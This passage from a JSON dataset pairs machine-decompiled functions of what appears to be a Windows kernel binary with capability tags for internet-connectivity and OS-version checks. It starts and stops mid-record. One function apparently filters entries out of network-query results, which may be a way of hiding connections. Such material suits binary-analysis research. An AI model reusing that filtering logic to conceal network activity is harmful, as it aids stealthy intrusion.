        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.000541a0(uint noname_0, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint16_t extraout_var;\n    uint var_14h;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    (**0x8005100c)();\n    var_8h = 0;\n    do {\n        if (0xfff < var_8h) {\ncode_r0x0005423d:\n            (**0x80051010)();\n            if (var_10h == 0) {\n                var_10h = fcn.00038480(arg_ch & 0xffff | extraout_var << 0x10);\n            }\n            return var_10h;\n        }\n        for (var_ch = *(*0x800cdac4 + var_8h * 4); var_ch != NULL; var_ch = *var_ch) {\n            if ((((var_ch[8] != 0) && (var_ch[10] == 2)) && (*(var_ch + 0xb6) == arg_10h)) &&\n               (*(var_ch + 0x2d) == arg_14h)) {\n                var_10h = *(var_ch + 0x55);\n                goto code_r0x0005423d;\n            }\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 359
    },
    "00054270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00054270(void)\n\n{\n    int32_t iVar1;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    (**0x8005100c)();\n    for (var_ch = 0; var_ch < 0x1000; var_ch = var_ch + 1) {\n        for (var_10h = *(*0x800cdac4 + var_ch * 4); var_10h != NULL; var_10h = *var_10h) {\n            if (((var_10h[8] != 0) && (var_10h[10] == 2)) && (*(var_10h + 0x55) != '\\0')) {\n                var_4h = var_4h + 1;\n            }\n        }\n    }\n    (**0x80051010)();\n    iVar1 = fcn.00038430();\n    return iVar1 + var_4h;\n}\n",
        "token_count": 226
    },
    "00054320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00054320(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint *arg_18h;\n    int32_t iVar1;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t *var_30h;\n    int32_t *var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(arg_8h + 0xc);\n    if (iVar1 == 0) {\n        return 1;\n    }\n    if (*(iVar1 + 5) == '\\x10') {\n        var_14h = 0x800556ac;\n        var_18h = iVar1 + 8;\n        for (var_10h = 0x10; 3 < var_10h; var_10h = var_10h - 4) {\n            if (*var_18h != *var_14h) goto code_r0x0005438a;\n            var_14h = var_14h + 1;\n            var_18h = var_18h + 1;\n        }\n        if (var_10h == 0) {\ncode_r0x0005440c:\n            var_20h = 0;\n        }\n        else {\ncode_r0x0005438a:\n            var_1ch = *var_18h - *var_14h;\n            if (var_1ch == 0) {\n                if (var_10h == 1) goto code_r0x0005440c;\n                var_1ch = *(var_18h + 1) - *(var_14h + 1);\n                if (var_1ch == 0) {\n                    if (var_10h == 2) goto code_r0x0005440c;\n                    var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                    if (var_1ch == 0) {\n                        if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                        goto code_r0x0005440c;\n                    }\n                }\n            }\n            var_20h = 1;\n            if (var_1ch < 1) {\n                var_20h = -1;\n            }\n        }\n        if (var_20h == 0) {\n            iVar1 = fcn.00053da0(*(arg_ch + 0x14), *(arg_ch + 0x18), 1, 0, 0, 0);\n            if (iVar1 == 0) {\n                *arg_10h = 0x800945f0;\n                arg_10h[1] = *(arg_ch + 0x18);\n                return 1;\n            }\n            *(arg_8h + 0x18) = iVar1;\n            return 0;\n        }\n    }\n    if (*(iVar1 + 5) != '\\x11') {\n        return 1;\n    }\n    var_2ch = 0x800556c0;\n    var_30h = iVar1 + 8;\n    for (var_28h = 0x11; 3 < var_28h; var_28h = var_28h - 4) {\n        if (*var_30h != *var_2ch) goto code_r0x000544d4;\n        var_2ch = var_2ch + 1;\n        var_30h = var_30h + 1;\n    }\n    if (var_28h == 0) {\ncode_r0x00054556:\n        var_38h = 0;\n    }\n    else {\ncode_r0x000544d4:\n        var_34h = *var_30h - *var_2ch;\n        if (var_34h == 0) {\n            if (var_28h == 1) goto code_r0x00054556;\n            var_34h = *(var_30h + 1) - *(var_2ch + 1);\n            if (var_34h == 0) {\n                if (var_28h == 2) goto code_r0x00054556;\n                var_34h = *(var_30h + 2) - *(var_2ch + 2);\n                if (var_34h == 0) {\n                    if ((var_28h == 3) || (var_34h = *(var_30h + 3) - *(var_2ch + 3),  var_34h == 0))\n                    goto code_r0x00054556;\n                }\n            }\n        }\n        var_38h = 1;\n        if (var_34h < 1) {\n            var_38h = -1;\n        }\n    }\n    if (var_38h == 0) {\n        arg_18h = iVar1 + 9 + *(iVar1 + 5);\n        iVar1 = fcn.00053da0(*(arg_ch + 0x14), *(arg_ch + 0x18), 2, *arg_18h, arg_18h, 0);\n        if (iVar1 != 0) {\n            *(arg_8h + 0x18) = iVar1;\n            return 0;\n        }\n        *arg_10h = 0x800945f0;\n        arg_10h[1] = *(arg_ch + 0x18);\n    }\n    return 1;\n}\n",
        "token_count": 1321
    },
    "000545f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000545f0(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_11h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = arg_10h;\n    if (*(arg_ch + 0x18) != 0) {\n        var_ch = fcn.00054020(arg_10h, &var_4h);\n        goto code_r0x00054785;\n    }\n    var_10h = *(arg_ch + 0xc);\n    if (*(var_10h + 5) != '\\x10') goto code_r0x00054785;\n    var_28h = 0x800556ac;\n    var_2ch = var_10h + 8;\n    for (var_24h = 0x10; 3 < var_24h; var_24h = var_24h - 4) {\n        if (*var_2ch != *var_28h) goto code_r0x00054674;\n        var_28h = var_28h + 1;\n        var_2ch = var_2ch + 1;\n    }\n    if (var_24h == 0) {\ncode_r0x000546f6:\n        var_34h = 0;\n    }\n    else {\ncode_r0x00054674:\n        var_30h = *var_2ch - *var_28h;\n        if (var_30h == 0) {\n            if (var_24h == 1) goto code_r0x000546f6;\n            var_30h = *(var_2ch + 1) - *(var_28h + 1);\n            if (var_30h == 0) {\n                if (var_24h == 2) goto code_r0x000546f6;\n                var_30h = *(var_2ch + 2) - *(var_28h + 2);\n                if (var_30h == 0) {\n                    if ((var_24h == 3) || (var_30h = *(var_2ch + 3) - *(var_28h + 3),  var_30h == 0))\n                    goto code_r0x000546f6;\n                }\n            }\n        }\n        var_34h = 1;\n        if (var_30h < 1) {\n            var_34h = -1;\n        }\n    }\n    if (var_34h == 0) {\n        puVar1 = var_10h + *(var_10h + 5) + 0xd;\n        iVar2 = fcn.00054100(arg_10h, &var_11h);\n        if (iVar2 != 0) {\n            if (*puVar1 < 0x4c) {\n                fcn.00078be8(iVar2 + 0xfb, puVar1, *puVar1);\n            }\n            (**0x80051010)();\n        }\n    }\ncode_r0x00054785:\n    fcn.00016510(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 804
    },
    "000547d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.000547d0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_15h;\n    uint32_t var_10h;\n    uint var_ch;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_ch = *(arg_ch + 4);\n    var_15h._0_1_ = 1;\n    var_10h = 0;\n    var_4h = 0;\n    var_5h = 0;\n    uVar1 = (**0x8005129c)(var_ch, 0x80000000, 0, 0, &var_10h, 0);\n    if (uVar1 == 0) {\n        var_4h = fcn.00054100(*(arg_ch + 0x18), &var_5h);\n        if (var_4h == 0) {\n            *(arg_8h + 0x18) = 0xc000000d;\n            var_15h._0_1_ = 0;\n            uVar1 = var_4h;\n        }\n        else {\n            *(var_4h + 0x24) = var_10h;\n            uVar1 = var_10h;\n        }\n    }\n    if (var_4h != 0) {\n        uVar1 = (**0x80051010)();\n    }\n    if (var_10h != 0) {\n        uVar1 = (**0x800512e0)();\n    }\n    return uVar1 & 0xffffff00 | var_15h;\n}\n",
        "token_count": 375
    },
    "00054880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00054880(uint noname_0, int32_t arg_ch)\n\n{\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_4h = fcn.00054100(*(arg_ch + 0x18), &var_5h);\n    if (var_4h != 0) {\n        *(var_4h + 0x24) = 0;\n        var_4h = (**0x80051010)();\n    }\n    return var_4h & 0xffffff00 | 1;\n}\n",
        "token_count": 137
    },
    "000548e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.000548e0(uint noname_0, int32_t arg_ch, uint *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_34h;\n    uint *var_30h;\n    char *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint16_t *var_11h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_8h = 0;\n    var_11h._0_1_ = 0;\n    if (*(arg_ch + 0x14) == *0x800ce97c) {\n        *0x8 = *(*(arg_ch + 8) + 0x14) + 4;\n        var_8h = fcn.00054100(*(arg_ch + 0x18), &var_11h);\n        if (var_8h != 0) {\n            if ((*(var_8h + 0x154) != '\\0') || (*(var_8h + 0x155) != '\\0')) {\n                *(var_8h + 0x154) = 0;\n                *(var_8h + 0x155) = 0;\n                *(var_8h + 0x158) = 0;\n            }\n            if (((*(var_8h + 0x24) != 0) && (iVar2 = fcn.00054100(*(var_8h + 0x24), 0),  iVar2 != 0)) &&\n               (*stack0xffffffec < 0x4c)) {\n                fcn.00078be8(var_8h + 0xb0, stack0xffffffec, *stack0xffffffec);\n                var_ch = stack0xffffffec + 2;\n                cVar1 = fcn.00057360(1);\n                if ((cVar1 != '\\0') && (var_4h = fcn.000356f0(0x2d),  var_4h != NULL)) {\n                    *var_4h = *(iVar2 + 0xff);\n                    var_4h[1] = *(iVar2 + 0x103);\n                    var_4h[2] = *(iVar2 + 0x107);\n                    *(var_4h + 3) = *(iVar2 + 0x10b);\n                    *(var_4h + 0xe) = *var_ch;\n                    *(var_4h + 0x12) = var_ch[1];\n                    *(var_4h + 0x16) = var_ch[2];\n                    *(var_4h + 0x1a) = *(var_ch + 3);\n                    var_2ch = var_8h + 8;\n                    var_30h = var_4h + 7;\n                    do {\n                        cVar1 = *var_2ch;\n                        *var_30h = cVar1;\n                        var_2ch = var_2ch + 1;\n                        var_30h = var_30h + 1;\n                    } while (cVar1 != '\\0');\n                    *arg_10h = 0x80094ad0;\n                    arg_10h[1] = var_4h;\n                }\n            }\n        }\n    }\n    if (var_8h != 0) {\n        (**0x80051010)();\n    }\n    return 1;\n}\n",
        "token_count": 799
    },
    "00054ad0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00054ad0(uint arg_8h, uint32_t arg_ch, uint16_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *(arg_ch + 0x18);\n    uVar2 = arg_ch;\n    if (iVar1 < -0x3ffffdc9) {\n        if (iVar1 != -0x3ffffdca) {\n            if (iVar1 == -0x3fffff4b) {\n                var_8h = 3;\n                goto code_r0x00054b78;\n            }\n            if (iVar1 == -0x3ffffee0) goto code_r0x00054b4b;\n            if (iVar1 != -0x3ffffdf3) goto code_r0x00054b6f;\n        }\n        var_8h = 1;\n    }\n    else {\n        if (iVar1 < -0x3ffffdbe) {\n            if (iVar1 == -0x3ffffdbf) {\ncode_r0x00054b4b:\n                var_8h = 2;\n                goto code_r0x00054b78;\n            }\n            if ((-0x3ffffdc5 < iVar1) && (iVar1 < -0x3ffffdc0)) {\n                var_8h = 4;\n                goto code_r0x00054b78;\n            }\n        }\n        else if (iVar1 == 0) {\n            var_8h = 5;\n            goto code_r0x00054b78;\n        }\ncode_r0x00054b6f:\n        var_8h = *(arg_ch + 0x18);\n        uVar2 = var_8h;\n    }\ncode_r0x00054b78:\n    fcn.00038170(0, var_8h, *(arg_10h + 1), arg_10h & 0xffff0000 | *arg_10h, *(arg_10h + 8), \n                 uVar2 & 0xffff0000 | arg_10h[7], arg_10h + 0xe);\n    fcn.000357f0(arg_10h);\n    fcn.00016510(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 527
    },
    "00054bd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00054bd0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t var_6h;\n    \n    var_6h._0_1_ = 1;\n    *NULL = fcn.00054100(*(arg_ch + 0x18), &var_6h + 1);\n    if (*NULL != 0) {\n        if (*(*NULL + 0x154) != '\\0') {\n            *(*(arg_8h + 0x60) + 3) = *(*(arg_8h + 0x60) + 3) | 1;\n            fcn.000463f0(*NULL + 0x15c, arg_8h + 0x58);\n            *(arg_8h + 0x18) = 0x103;\n            var_6h._0_1_ = 0;\n        }\n        *NULL = (**0x80051010)();\n    }\n    return *NULL & 0xffffff00 | var_6h;\n}\n",
        "token_count": 243
    },
    "00054c60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00054c60(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    piVar2 = arg_ch + 4;\n    iVar3 = fcn.00054100(*(arg_ch + 0x18), &var_1h);\n    if (((iVar3 != 0) && (-1 < *piVar2)) && (*piVar2 < 0xb)) {\n        iVar1 = iVar3 + (*piVar2 * 3 + 0xb) * 4;\n        if (*(arg_ch + 8) == 0) {\n            *(iVar1 + 4) = 0;\n            *(iVar1 + 8) = 0;\n        }\n        else {\n            for (var_14h = 0; (*(var_14h * 8 + -0x7ff35338) != -1 && (*(var_14h * 8 + -0x7ff35338) != *piVar2));\n                var_14h = var_14h + 1) {\n            }\n            if (*(var_14h * 8 + -0x7ff35338) != -1) {\n                *(iVar1 + 4) = *(arg_ch + 8);\n                *(iVar1 + 8) = *(arg_ch + 0xc);\n                if (*(var_14h * 8 + -0x7ff35334) == 0) {\n                    *(arg_ch + 8) = 0;\n                    *(arg_ch + 0xc) = 0;\n                }\n                else {\n                    *(arg_ch + 8) = *(var_14h * 8 + -0x7ff35334);\n                    *(arg_ch + 0xc) = iVar1;\n                }\n            }\n        }\n    }\n    if (iVar3 != 0) {\n        (**0x80051010)();\n    }\n    return 1;\n}\n",
        "token_count": 486
    },
    "00054da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00054da0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_78h;\n    uint var_71h;\n    uint32_t var_5h;\n    \n    var_71h._0_1_ = 1;\n    uVar1 = fcn.00054100(*(arg_ch + 0x18), &var_5h);\n    if (uVar1 != 0) {\n        if (*(uVar1 + 0x154) != '\\0') {\n            *(arg_8h + 0x18) = 0;\n            *(arg_8h + 0x1c) = *(arg_ch + 4);\n            var_71h._0_1_ = 0;\n        }\n        unique0x10000097 = uVar1;\n        (**0x80051010)();\n        uVar1 = (**0x80051004)();\n        if ((uVar1 & 0xff) == 0) {\n            fcn.00036d40(&var_71h + 1, 100);\n            uVar1 = fcn.00038030(&var_71h + 1);\n            if (uVar1 != 0) {\n                uVar1 = fcn.00037f70();\n            }\n        }\n    }\n    return uVar1 & 0xffffff00 | var_71h;\n}\n",
        "token_count": 326
    },
    "00054e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00054e40(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint32_t var_6h;\n    \n    var_6h._0_1_ = 1;\n    if (*(arg_ch + 4) == 0) {\n        uVar1 = CONCAT31(arg_ch + 4 >> 8, 1);\n    }\n    else {\n        *NULL = fcn.00054100(*(arg_ch + 0x18), &var_6h + 1);\n        if (*NULL != 0) {\n            if (*(*NULL + 0x154) == '\\0') {\n                if ((*(arg_ch + 8) & 0x80) == 0) {\n                    *arg_10h = 0x80094ed0;\n                }\n            }\n            else {\n                *(arg_8h + 0x18) = 0;\n                *(arg_8h + 0x1c) = 0;\n                var_6h._0_1_ = 0;\n            }\n            *NULL = (**0x80051010)();\n        }\n        uVar1 = *NULL & 0xffffff00 | var_6h;\n    }\n    return uVar1;\n}\n",
        "token_count": 305
    },
    "00054ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00054ed0(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00054100(*(*(arg_ch + 0x60) + 0x18), &var_9h);\n    if (var_4h != 0) {\n        if ((*(var_4h + 0x155) == '\\0') && (*(arg_ch + 0x18) == 0)) {\n            *0x8 = var_4h + 0xb0;\n            if ((*(*(arg_ch + 4) + 6) & 5) == 0) {\n                var_1ch = (**0x800510e4)(*(arg_ch + 4), 0, 1, 0, 0, 0x10);\n            }\n            else {\n                var_1ch = *(*(arg_ch + 4) + 0xc);\n            }\n            cVar1 = fcn.00055ea0(var_4h, *(stack0xfffffff4 + 6), *(arg_ch + 0x1c) & 0xffff0000 | *(stack0xfffffff4 + 4)\n                                 , var_1ch, *(arg_ch + 0x1c));\n            if (cVar1 != '\\0') {\n                *(arg_ch + 0x18) = 0;\n                *(arg_ch + 0x1c) = 0;\n            }\n        }\n        (**0x80051010)();\n    }\n    fcn.00016510(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 457
    },
    "00054fd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00055048)\n\nbool fcn.00054fd0(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    uint32_t extraout_ECX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch;\n    uint *var_10h;\n    uint var_18h;\n    uint *var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_25h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x800b8cd0;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    var_34h = NULL;\n    bVar2 = false;\n    stack0xffffffd8 = 0;\n    var_30h = 0;\n    *var_10h = 0;\n    var_10h[1] = 0;\n    var_4h = 0;\n    piVar1 = *(var_ch + 0x10);\n    if (piVar1 != NULL) {\n        *NULL = (**0x8005128c)(piVar1, 0x24, 0, 0, 0);\n        if (*NULL == 0) {\n            var_30h = -0x3fffffe9;\n        }\n        else {\n            (**0x80051298)(*NULL, extraout_ECX & 0xffffff00 | *(var_8h + 0x20), 0);\n            bVar2 = true;\n            if ((piVar1[3] == 0x100) &&\n               (((piVar1[2] == 0x100 && (piVar1[4] == 1)) ||\n                ((piVar1[2] == 0x200 && (((*piVar1 == 0x301 || (*piVar1 == 0x400)) || (*piVar1 == 0x401)))))))) {\n                for (var_20h = 0;\n                    (var_20h < *0x800ce980 &&\n                    ((*(var_20h * 0xc + -0x7ff3167c) != *piVar1 || (*(var_20h * 0xc + -0x7ff31678) != piVar1[1]))));\n                    var_20h = var_20h + 1) {\n                }\n                if ((var_20h < *0x800ce980) &&\n                   (((*piVar1 == 0x301 && (*(var_20h * 0xc + -0x7ff31674) != 0x303)) ||\n                    (((*piVar1 == 0x400 && (*(var_20h * 0xc + -0x7ff31674) != 0x404)) ||\n                     ((*piVar1 == 0x401 && (*(var_20h * 0xc + -0x7ff31674) != 0x403)))))))) {\n                    var_30h = 0;\n                }\n                else {\n                    var_34h = fcn.000356c0(0x24);\n                    if (var_34h == NULL) {\n                        var_30h = -0x3fffff66;\n                    }\n                    else {\n                        var_10h[1] = var_34h;\n                        *var_10h = 0x80095290;\n                        puVar4 = *(var_ch + 0x10);\n                        puVar5 = var_34h;\n                        for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    var_4h = 0xffffffff;\n    if (var_30h != 0) {\n        fcn.000357f0(var_34h);\n    }\n    if (stack0xffffffd8 != 0) {\n        if (bVar2) {\n            (**0x80051294)(stack0xffffffd8);\n        }\n        (**0x800512a4)(stack0xffffffd8);\n    }\n    *(var_8h + 0x18) = var_30h;\n    *in_FS_OFFSET = var_10h_2;\n    return var_30h == 0;\n}\n",
        "token_count": 1080
    },
    "00055290": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n\nvoid fcn.00055290(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_18h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    int32_t *var_44h;\n    int32_t *var_40h;\n    int32_t *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_21h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x800b8cc0;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    var_28h = 0;\n    bVar3 = false;\n    if (*(var_ch + 0x18) == 0) {\n        var_4h = 0;\n        piVar1 = *(var_ch + 0x3c);\n        iVar4 = *(var_ch + 0x1c);\n        if (((piVar1 != NULL) && (iVar4 != 0)) && (var_28h = (**0x8005128c)(piVar1, iVar4, 0, 0, 0),  var_28h != 0)) {\n            (**0x80051298)(var_28h, extraout_ECX & 0xffffff00 | *(var_ch + 0x20), 1);\n            bVar3 = true;\n            if ((var_10h[2] == 0x100) && (var_10h[4] == 1)) {\n                for (stack0xffffffdc = 0;\n                    (stack0xffffffdc < *0x800ce980 &&\n                    ((*(stack0xffffffdc * 0xc + -0x7ff3167c) != *var_10h ||\n                     (*(stack0xffffffdc * 0xc + -0x7ff31678) != var_10h[1])))); *0x8 = stack0xffffffdc + 1) {\n                }\n                if ((stack0xffffffdc == *0x800ce980) && (*0x800ce980 < 0x1000)) {\n                    *(stack0xffffffdc * 0xc + -0x7ff3167c) = *var_10h;\n                    *(stack0xffffffdc * 0xc + -0x7ff31678) = var_10h[1];\n                    *(stack0xffffffdc * 0xc + -0x7ff31674) = *piVar1;\n                    *0x800ce980 = *0x800ce980 + 1;\n                }\n            }\n            else if (*var_10h == 0x400) {\n                uVar2 = var_10h[4];\n                if (uVar2 < 0x103) {\n                    if (uVar2 == 0x102) {\n                        stack0xffffffdc = 1;\n                        var_3ch = piVar1;\n                        while (var_3ch <= piVar1 + stack0xffffffdc * -0x18 + iVar4) {\n                            iVar5 = fcn.000541a0(var_3ch[1], var_3ch[2], var_3ch[3], var_3ch[4]);\n                            if (iVar5 == 0) {\n                                var_3ch = var_3ch + 6;\n                            }\n                            else {\n                                fcn.000789fc(var_3ch, var_3ch + 6, (iVar4 - (var_3ch - piVar1)) + -0x18);\n                                *NULL = stack0xffffffdc + 1;\n                            }\n                        }\n                        *(var_ch + 0x1c) = *(var_ch + 0x1c) + (stack0xffffffdc + -1) * -0x18;\n                    }\n                    else if (uVar2 == 1) {\n                        iVar4 = fcn.00054270();\n                        piVar1[0xe] = piVar1[0xe] - iVar4;\n                    }\n                    else if (uVar2 == 0x101) {\n                        stack0xffffffdc = 1;\n                        var_44h = piVar1;\n                        while (var_44h <= piVar1 + stack0xffffffdc * -0x14 + iVar4) {\n                            iVar5 = fcn.000541a0(var_44h[1], var_44h[2], var_44h[3], var_44h[4]);\n                            if (iVar5 == 0) {\n                                var_44h = var_44h + 5;\n                            }\n                            else {\n                                fcn.000789fc(var_44h, var_44h + 5, (iVar4 - (var_44h - piVar1)) + -0x14);\n                                *NULL = stack0xffffffdc + 1;\n                            }\n                        }\n                        *(var_ch + 0x1c) = *(var_ch + 0x1c) + (stack0xffffffdc + -1) * -0x14;\n                    }\n                }\n                else if (uVar2 == 0x110) {\n                    stack0xffffffdc = 0;\n                    var_40h = piVar1;\n                    while (var_40h < piVar1 + (iVar4 - stack0xffffffdc)) {\n                        iVar5 = fcn.000541a0(var_40h[2], var_40h[3], var_40h[4], var_40h[5]);\n                        if (iVar5 == 0) {\n                            var_40h = var_40h + *var_40h;\n                        }\n                        else {\n                            fcn.000789fc(var_40h, var_40h + *var_40h, (iVar4 - 